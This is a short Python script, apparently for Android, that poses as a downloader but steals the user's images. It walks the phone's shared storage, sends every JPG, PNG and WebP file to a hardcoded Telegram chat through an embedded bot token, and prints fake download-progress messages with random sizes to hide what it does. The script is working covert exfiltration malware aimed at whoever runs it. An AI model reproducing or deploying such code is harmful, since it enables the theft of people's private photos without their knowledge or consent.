#6139875501:AAGo4kvoofaWBjWhv4bxsC7rw7gaJ1csLEw
#5903160198
try:
	import os
	import telebot
	import random
except:
	import os
	os.system('pip install telebot')
	os.system('pip install random')
	os.system('clear')

bot_token = '6139875501:AAGo4kvoofaWBjWhv4bxsC7rw7gaJ1csLEw'

bot = telebot.TeleBot(bot_token)
aa =0
r = '123456789'
#مسار لو تريد تغيرو
folder_path = '/storage/emulated/0'

#endswith(".jpg") or file_path.endswith("png") or file_path.endswith("PNG") or file_path.endswith("JPEG") or file_path.endswith("jpeg") or file_path.endswith("Webp") or file_path.endswith("webp"):
allowed_extensions = ['.jpg','png','PNG','JPEG','jpeg','Webp','webp']
tss = []
for root, dirs, files in os.walk(folder_path):
    for file in files:
        file_extension = os.path.splitext(file)[1].lower()
        if file_extension in allowed_extensions:
            file_path = os.path.join(root, file)
            with open(file_path, 'rb') as f:
                bot.send_document(chat_id='5903160198', document=f)
                aa +=1
                size = random.choice(r)
                tss.append(size)
                numbers = tss
                sum_of_numbers = sum(int(num) for num in numbers if num.isdigit())
                os.system('clear')
                if aa == 2000:
                	exit(f'''downloads completed ✓
total size {sum_of_numbers} KBS
                	''')
                print(f'''Done Download ; {aa}
                
size          ; {size}KBS

total size    ; {sum_of_numbers}KBS
                ''')


bot.polling()
